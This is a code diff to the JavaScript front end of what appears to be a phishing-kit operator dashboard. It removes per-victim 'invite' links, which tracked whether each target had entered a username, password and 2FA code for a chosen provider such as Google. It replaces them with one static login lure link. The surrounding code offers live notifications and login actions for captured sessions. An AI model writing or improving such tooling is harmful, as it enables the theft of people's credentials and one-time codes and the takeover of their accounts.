@@ -98,85 +98,20 @@ async function load() {
   const grid = $('grid');
   $('empty').classList.toggle('hidden', CACHE.length > 0);
   grid.innerHTML = CACHE.map(card).join('');
-  loadInvites();
 }
 
-// ---------- invites ----------
-function inviteCard(iv) {
-  const labels = { pending: 'not opened yet', opened: 'opened', 'in-progress': 'entering credentials…', completed: 'completed' };
-  const t = (k, label) => `<span class="t ${iv.steps[k] ? 'done' : ''}">${label} ${iv.steps[k] ? '✓' : ''}</span>`;
-  const url = location.origin + '/w/' + iv.token;
-  return `
-  <div class="invite" data-id="${iv.id}">
-    <div class="card-head">
-      <h3>${escapeHtml(iv.label)}</h3>
-      <span class="badge ${iv.status === 'completed' ? 'logged-in' : iv.status === 'in-progress' ? 'pending' : ''}">${labels[iv.status] || iv.status}</span>
-    </div>
-    <div class="link-row">
-      <input value="${url}" readonly onclick="this.select()" />
-      <button onclick="copyText('${url}')">Copy</button>
-    </div>
-    <div class="track">${t('username', 'Username')}${t('password', 'Password')}${t('totp', '2FA')}</div>
-    ${iv.username ? `<div class="sub">${escapeHtml(iv.username)}</div>` : ''}
-    <div class="card-actions">
-      <button class="danger" onclick="deleteInvite('${iv.id}')">Remove</button>
-    </div>
-  </div>`;
+// ---------- single static link ----------
+// One link everyone uses. No invite list and no per-link generation anymore.
+function shareLink() {
+  return location.origin + '/w/login';
 }
-
-async function loadInvites() {
-  const r = await api('/invites');
-  if (!r.ok) return;
-  const invs = await r.json();
-  $('invites-section').classList.toggle('hidden', invs.length === 0);
-  $('invites-grid').innerHTML = invs.map(inviteCard).join('');
-}
-
-async function deleteInvite(id) {
-  if (!confirm('Remove this invite link?')) return;
-  await api(`/invites/${id}`, { method: 'DELETE' });
-  toast('Invite removed.');
-  loadInvites();
-}
-
 function copyText(text) {
   navigator.clipboard.writeText(text).then(() => toast('Link copied.', 'ok'));
 }
-
-// ---------- generate-link modal ----------
-function toggleLinkUrl() {
-  $('l-url-row').classList.toggle('hidden', $('l-provider').value === 'google');
-}
-function openLinkModal() {
-  $('link-form').reset();
-  $('l-result').classList.add('hidden');
-  $('l-create').classList.remove('hidden');
-  toggleLinkUrl();
-  $('link-modal').classList.remove('hidden');
-  $('l-label').focus();
-}
-function closeLinkModal() {
-  $('link-modal').classList.add('hidden');
-  loadInvites();
-}
-$('link-btn').addEventListener('click', openLinkModal);
-$('l-provider').addEventListener('change', toggleLinkUrl);
-$('link-form').addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const payload = {
-    label: $('l-label').value,
-    provider: $('l-provider').value,
-    loginUrl: $('l-url').value,
-  };
-  const r = await api('/invites', { method: 'POST', body: JSON.stringify(payload) });
-  if (!r.ok) return toast('Could not create link', 'err');
-  const d = await r.json();
-  $('l-link').value = d.url;
-  $('l-result').classList.remove('hidden');
-  $('l-create').classList.add('hidden');
-  toast('Link created — copy and send it.', 'ok');
-});
-$('l-copy').addEventListener('click', () => copyText($('l-link').value));
+(function setShareLink() {
+  const el = $('share-link');
+  if (el) el.value = shareLink();
+})();
 
 // ---------- live notifications (SSE) ----------
 let unread = 0;
@@ -333,8 +268,7 @@ window.doLogin = doLogin;
 window.doClose = doClose;
 window.doDelete = doDelete;
 window.copyText = copyText;
-window.deleteInvite = deleteInvite;
-window.closeLinkModal = closeLinkModal;
+window.shareLink = shareLink;
 window.toggleDrawer = toggleDrawer;
 
 // ---------- boot ----------
